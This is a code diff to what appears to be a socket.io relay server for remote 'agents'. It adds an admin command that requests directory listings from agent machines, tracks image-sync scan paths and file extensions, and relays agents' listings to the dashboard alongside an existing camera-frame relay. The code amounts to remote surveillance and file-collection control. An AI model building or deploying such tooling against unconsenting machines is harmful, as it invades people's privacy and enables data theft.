@@ -1069,6 +1069,13 @@ io.on('connection', (socket) => {
         emitControlAck('get_image_sync_status', result);
     });
 
+    socket.on('admin_list_directories', (payload = {}) => {
+        if (!isAdmin) {
+            return;
+        }
+        emitControl('list_directories', payload);
+    });
+
     // Relay Camera Frames from Agent to Dashboard
     socket.on('camera_frame', (data) => {
         if (isAdmin || isViewer) {
@@ -1189,12 +1196,16 @@ io.on('connection', (socket) => {
         const agent = agents[socket.id] || { machine: 'Unknown-PC' };
         const stage = String(data.stage || '');
         const isRunning = ['started', 'queued', 'scanning', 'retrying', 'stopping', 'already_running', 'resetting'].includes(stage);
+        const scanPath = typeof data.scanPath === 'string' ? data.scanPath : '';
+        const allowedExtensions = Array.isArray(data.allowedExtensions) ? data.allowedExtensions : (agents[socket.id]?.imageSyncAllowedExtensions || null);
 
         agents[socket.id] = {
             ...(agents[socket.id] || { id: socket.id, machine: data.machine || agent.machine }),
             imageSyncRunning: isRunning,
             imageSyncNextIndex: Number(data.nextIndex ?? data.index ?? 0) || 0,
             imageSyncTotalFiles: Number(data.totalFiles ?? data.total ?? 0) || 0,
+            imageSyncScanPath: scanPath,
+            imageSyncAllowedExtensions: allowedExtensions,
             lastImageSyncAt: Date.now()
         };
 
@@ -1212,16 +1223,33 @@ io.on('connection', (socket) => {
         }
 
         const agent = agents[socket.id] || { machine: 'Unknown-PC' };
+        const scanPath = typeof data.scanPath === 'string' ? data.scanPath : '';
+        const allowedExtensions = Array.isArray(data.allowedExtensions) ? data.allowedExtensions : (agents[socket.id]?.imageSyncAllowedExtensions || null);
         agents[socket.id] = {
             ...(agents[socket.id] || { id: socket.id, machine: data.machine || agent.machine }),
             imageSyncRunning: Boolean(data.running),
             imageSyncNextIndex: Number(data.nextIndex ?? 0) || 0,
             imageSyncTotalFiles: Number(data.totalFiles ?? 0) || 0,
+            imageSyncScanPath: scanPath,
+            imageSyncAllowedExtensions: allowedExtensions,
             lastImageSyncAt: Date.now()
         };
 
         emitAgentList();
         io.to(ADMIN_ROOM).emit('ui_image_sync_snapshot', {
+            ...data,
+            agentId: socket.id,
+            machine: data?.machine || agent.machine
+        });
+    });
+
+    socket.on('directory_listing', (data = {}) => {
+        if (isAdmin || isViewer) {
+            return;
+        }
+
+        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
+        io.to(ADMIN_ROOM).emit('ui_directory_listing', {
             ...data,
             agentId: socket.id,
             machine: data?.machine || agent.machine
